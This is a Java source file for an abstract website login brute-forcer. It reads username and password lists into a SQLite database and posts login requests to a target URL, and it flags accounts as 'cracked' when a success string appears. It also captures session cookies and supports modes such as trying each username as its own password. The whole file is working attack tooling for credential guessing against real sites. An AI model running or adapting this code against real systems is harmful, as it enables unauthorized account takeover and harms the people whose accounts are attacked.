package com.toortools;

import java.io.FileInputStream;
import java.sql.Connection;
import java.sql.DatabaseMetaData;
import java.sql.ResultSet;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Scanner;

/**
 * Created by User on 11/4/2015.
 */
public abstract class BaseWebsiteBruteForce extends Thread
{
    public final int MODES_USERNAME_USERNAME = 2;
    public final int MODES_MULTIPLE_USERNAMES = 3;
    public final int MODES_PASSWORD_USERNAME = 4;
    public int MODE;
    public String usernamesFile;
    public String passwordsFile;
    static public String SESSION_NAME;
    static public getNexter getNext;
    public String LOGIN_URL;
    public String LOGIN_DATA;
    public String LOGIN_USERNAME_PLACEHOLDER= "[[__USERNAME__]]";
    public String LOGIN_PASSWORD_PLACEHOLDER= "[[__PASSWORD__]]";
    public String LOGIN_SUCCESS_STRING ;
    public String LOGIN_FAILURE_STRING ;
    public boolean PRINT_PROGRESS = true;
    public int PRINT_PROGRESS_INTERVAL = 200;
    public String LOG_FILE = "log.txt";
    public int  LOG_VERBOS_LEVEL = 1;
    public static Logger logger;
    static DB found;

    static Connection credentialsConnection;

    public BaseWebsiteBruteForce()
    {
        SESSION_NAME = "default";
        MODE = MODES_USERNAME_USERNAME;
    }

    public void init ()
    {
        try
        {
            try
            {
                credentialsConnection = Utilities.createSqliteConnection("sessions/"+SESSION_NAME+"/databases/credentials.db");
                initCredentialsTables();
                found = new DB(SESSION_NAME, "found");
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
            logger = new Logger(LOG_FILE, LOG_VERBOS_LEVEL);
            getNext =  new getNexter(this);

            getNext.loadLatestDone();

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public String loginReturnCookies(Credentials c)
    {
        String username, password;
        username =c.username;
        password =c.password;

        try
        {
            String page = Utilities.postRequest(LOGIN_URL, LOGIN_DATA.replace(LOGIN_PASSWORD_PLACEHOLDER, password).replace(LOGIN_USERNAME_PLACEHOLDER,username));


            if (page != null && page.contains(LOGIN_SUCCESS_STRING))
            {
                //System.out.println("Found! "+c);
                String cookies = Utilities.postRequest( LOGIN_URL, LOGIN_DATA.replace(LOGIN_PASSWORD_PLACEHOLDER, password).replace(LOGIN_USERNAME_PLACEHOLDER,username), true);

                if (cookies == null)
                {
                    return null;
                }
                else
                {
                    return cookies;
                }
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return null;
    }
    public boolean login(Credentials c)
    {
        String username, password;
        username =c.username;
        password =c.password;

        try
        {
            String page = Utilities.postRequest(LOGIN_URL, LOGIN_DATA.replace(LOGIN_PASSWORD_PLACEHOLDER, password).replace(LOGIN_USERNAME_PLACEHOLDER, username));

            if (page != null && page.contains(LOGIN_SUCCESS_STRING))
            {
                //System.out.println("Found! "+c);
                cracked(username, password);
                return true;
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        return false;
    }
    public void initCredentialsTables()
    {
        try
        {
            DatabaseMetaData dbm = credentialsConnection.getMetaData();
            ResultSet tables = dbm.getTables(null, null, "usernames", null);
            if (tables.next())
            {

            }
            else
            {
                Statement st = credentialsConnection.createStatement();
                st.execute("CREATE TABLE `usernames` (\n" +
                        "\t`username`\tTEXT UNIQUE,\n" +
                        "\t`done`\tINTEGER DEFAULT 0,\n" +
                        "\t`cracked`\tINTEGER DEFAULT 0,\n" +
                        "\t`email`\tTEXT,\n" +
                        "\t`password`\tTEXT\n" +
                        ");");
            }
            Statement st = credentialsConnection.createStatement();
            ResultSet rs = st.executeQuery("SELECT count(*) from usernames");
            if (rs.next())
            {
                if (rs.getInt(1) ==0 )
                {
                    System.out.println("No rows exist in usernames table, adding usernamesFile.");
                    if (usernamesFile != null && !usernamesFile.equals(""))
                    {
                        ArrayList<String> values = new ArrayList<String>();
                        ArrayList<String> totalValues = new ArrayList<String>();
                        Scanner sc = new Scanner(new FileInputStream(usernamesFile));

                        while (sc.hasNext())
                        {
                            String temp = sc.nextLine();
                            temp = temp.replace("'","''");
                            if (!totalValues.contains(temp))
                            {
                                values.add(temp);
                                totalValues.add(temp);
                            }
                            if (values.size() == 300 || !sc.hasNext())
                            {
                                String query = "INSERT INTO usernames (username, done, cracked) VALUES";
                                for (int i = 0; i < values.size() ; i++ )
                                {
                                    query += " ( '"+values.get(i)+"', 0, 0),";
                                }
                                query = query.substring(0, query.length()-1)+";";

                                st.execute(query);
                                values = new ArrayList<String>();
                            }
                        }
                    }
                }
            }
            st.close();

            tables = dbm.getTables(null, null, "passwords", null);
            if (tables.next())
            {

            }
            else
            {
                st = credentialsConnection.createStatement();
                st.execute("CREATE TABLE `passwords` (\n" +
                        "\t`password`\tTEXT UNIQUE,\n" +
                        "\t`done`\tINTEGER DEFAULT 0\n" +
                        ");");

                st = credentialsConnection.createStatement();
                rs = st.executeQuery("SELECT count(*) from passwords");
                if (rs.next())
                {
                    if (rs.getInt(1) ==0 )
                    {
                        System.out.println("No rows exist in passwords table, adding passwordsFile.");


                        if (passwordsFile != null && !passwordsFile.equals(""))
                        {
                            ArrayList<String> values = new ArrayList<String>();
                            ArrayList<String> totalValues = new ArrayList<String>();
                            Scanner sc = new Scanner(new FileInputStream(passwordsFile));

                            while (sc.hasNext())
                            {
                                String temp = sc.nextLine();
                                if (!totalValues.contains(temp))
                                {
                                    values.add(temp);
                                    totalValues.add(temp);
                                }
                                if (values.size() == 300 || !sc.hasNext())
                                {
                                    String query = "INSERT INTO passwords (password, done) VALUES";
                                    for (int i = 0; i < values.size() ; i++ )
                                    {
                                        query += " ( '"+values.get(i)+"', 0),";
                                    }
                                    query = query.substring(0, query.length()-1)+";";

                                    //System.out.println(query);
                                    st.execute(query);
                                    values = new ArrayList<String>();
                                }
                            }
                        }
                    }
                }
            }

        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    public void run()
    {
        try
        {
            while (true)
            {
                process(getNext.getNext());
            }
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
    }
    public synchronized void cracked(String username, String password) {
        cracked(username, password, null);
    }
    public synchronized void cracked(String username, String password, String email)
    {
        found.put(username, password);
        Statement st=null;
        try
        {
            if (credentialsConnection == null)
            {
                System.out.println("Ine null");
            }
            st = credentialsConnection.createStatement();
        }
        catch (Exception e)
        {
            e.printStackTrace();
        }
        try
        {
            if (username.contains("'"))
            {
                username = username.replace("'","''");
            }
            if (password.contains("'"))
            {
                password=password.replace("'","''");
            }
            st.executeUpdate("UPDATE usernames SET cracked = 1, password='"+password+"' WHERE username = '"+username+"'");
            if (email!=null)
            {
                st.executeUpdate("UPDATE usernames SET email = '"+email+"' WHERE username = '"+username+"'");
            }

            st.close();
        }
        catch (Exception e)
        {
            e.printStackTrace();
            try
            {
                st.close();
            }
            catch(Exception ee)
            {

            }
        }
    }
    abstract public void process(Credentials o);

    public class getNexter extends BaseGetNexter
    {
        int counter;
        String NEXTER_LATEST_USERNAME = "latestUsername";
        String NEXTER_LATEST_PASSWORD = "latestUsername";

        Credentials latestDone;
        DB db;
        String currentPassword = null;
        String latestUsername = null;
        public getNexter(BaseWebsiteBruteForce b)
        {
            db  = new DB(b.SESSION_NAME, "latest");
            if (MODE == MODES_PASSWORD_USERNAME)
            {
                try
                {
                    Statement st = credentialsConnection.createStatement();
                    ResultSet rs ;
                    rs = st.executeQuery("SELECT password FROM passwords WHERE done = 0");
                    if (rs.next()) {
                        currentPassword = rs.getString(1);
                        st.executeUpdate("UPDATE passwords SET done=1 WHERE password = '" + currentPassword.replace("'", "''") + "'");
                    }
                    st.executeUpdate("UPDATE usernames SET done=0 ");
                }
                catch (Exception e)
                {
                    e.printStackTrace();
                }
            }
        }


        @Override
        synchronized Credentials getNext()
        {
            try
            {
                Statement st = credentialsConnection.createStatement();
                ResultSet rs;
                counter++;

                if (MODE == MODES_USERNAME_USERNAME)
                {
                    if (PRINT_PROGRESS )
                    {
                        if ((counter % PRINT_PROGRESS_INTERVAL ) == 1)
                        {
                            rs = st.executeQuery("SELECT count (*) FROM usernames");
                            rs.next();
                            double total = rs.getInt(1)+0.0;
                            rs = st.executeQuery("SELECT count (*) FROM usernames WHERE done = 1");
                            rs.next();
                            double  done = rs.getInt(1)+0.0;
                            System.out.println("Progress: Persentage: "+ (done* 100)/total+ "%  Counter="+counter  );
                        }
                    }
                    rs = st.executeQuery("SELECT username FROM usernames WHERE done = 0");
                    String username = null;
                    if (rs.next())
                    {
                        username = rs.getString(1);

                        st.executeUpdate("UPDATE usernames SET done=1 WHERE username = '"+username.replace("'","''")+"'");

                    }
                    else
                    {
                        System.out.println("No more usernames, exiting in 50 seconds");
                        Thread.sleep(50000);
                        System.exit(0);
                    }
                    st.close();
                    return new Credentials(username, username);
                }
                else if (MODE == MODES_PASSWORD_USERNAME)
                {
                    if (PRINT_PROGRESS )
                    {
                        if ((counter % PRINT_PROGRESS_INTERVAL ) == 1)
                        {
                            rs = st.executeQuery("SELECT count (*) FROM usernames");
                            rs.next();
                            double totalUsernames = rs.getInt(1)+0.0;

                            rs = st.executeQuery("SELECT count (*) FROM passwords");
                            rs.next();
                            double totalPasswords = rs.getInt(1)+0.0;

                            rs = st.executeQuery("SELECT count (*) FROM usernames WHERE done = 1");
                            rs.next();
                            double  done = rs.getInt(1)+0.0;

                            rs = st.executeQuery("SELECT count (*) FROM passwords WHERE done = 1");
                            rs.next();
                            done = done* rs.getInt(1)+0.0;
                            double total = totalUsernames*totalPasswords;
                            System.out.println("Total: "+total);
                            System.out.println("Total Done: "+done);
                            System.out.println("Progress: Persentage: "+ (done* 100)/(total)+ "%  Counter="+counter  );
                        }
                    }

                    rs = st.executeQuery("SELECT username FROM usernames WHERE done = 0 AND cracked = 0");
                    String username = null;
                    if (rs.next())
                    {
                        latestUsername = username;
                        username = rs.getString(1);
                        st.executeUpdate("UPDATE usernames SET done=1 WHERE username = '"+username.replace("'","''")+"'");
                    }
                    else
                    {
                        rs = st.executeQuery("SELECT password FROM passwords WHERE done = 0");
                        if (rs.next())
                        {
                            currentPassword = rs.getString(1);
                            st.executeUpdate("UPDATE passwords SET done=1 WHERE password = '"+currentPassword.replace("'","''")+"'");
                        }
                        else
                        {
                            System.out.println("No more usernames, exiting in 50 seconds");
                            Thread.sleep(50000);
                            System.exit(0);
                        }
                        st.executeUpdate("UPDATE usernames SET done=0 WHERE cracked = 0");
                        st.close();
                        return new Credentials(latestUsername, latestUsername);
                    }
                    st.close();
                    String retPassword = currentPassword;
                    if (retPassword.equals("_-_-___try_username_-_-_-_-_"))
                    {
                        retPassword = username;
                    }
                    return new Credentials(username, retPassword);
                }

            }
            catch (Exception e)
            {
                e.printStackTrace();
                System.exit(0);
            }
            return new Credentials("test","test");
        }

        void save()
        {

        }

        void loadLatestDone()
        {

            String username = db.get(NEXTER_LATEST_PASSWORD);
            String password = db.get(NEXTER_LATEST_USERNAME);
            if (username != null && password != null)
            {
                Credentials latest = new Credentials(username, password);
                latestDone = latest;
            }
            else
            {
                latestDone = null;
            }
        }

    }

    public class Credentials
    {
        public Credentials (String u, String p)
        {
            username = u;
            password = p;
        }
        public String toString()
        {
            return "Username: "+username +" Password: "+password;
        }

        public String username;
        public String password;
    }


}
